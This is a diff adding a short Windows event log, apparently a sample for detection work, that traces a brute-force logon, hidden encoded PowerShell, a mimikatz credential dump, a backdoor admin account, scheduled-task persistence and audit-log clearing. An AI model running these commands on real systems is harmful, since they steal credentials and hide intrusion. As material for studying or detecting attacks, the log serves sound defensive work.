@@ -1,0 +1,15 @@
+2026-10-18T09:00:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:01:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:02:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:03:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:04:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:05:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:06:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:07:11Z EventID=4625 An account failed to log on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:09:40Z EventID=4624 An account was successfully logged on. Account=Administrator Source Network Address=203.0.113.150 LogonType=3
+2026-10-18T09:10:02Z EventID=4688 New process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA
+2026-10-18T09:11:15Z EventID=4688 New process: C:\Users\Public\m.exe privilege::debug sekurlsa::logonpasswords (mimikatz)
+2026-10-18T09:12:30Z EventID=4720 A user account was created. New Account=svc_backup
+2026-10-18T09:12:31Z EventID=4732 A member was added to a security-enabled local group. Group=Administrators Member=svc_backup
+2026-10-18T09:13:00Z EventID=4688 New process: schtasks /create /sc onlogon /tn Updater /tr C:\Users\Public\m.exe
+2026-10-18T09:15:44Z EventID=1102 The audit log was cleared. Account=Administrator
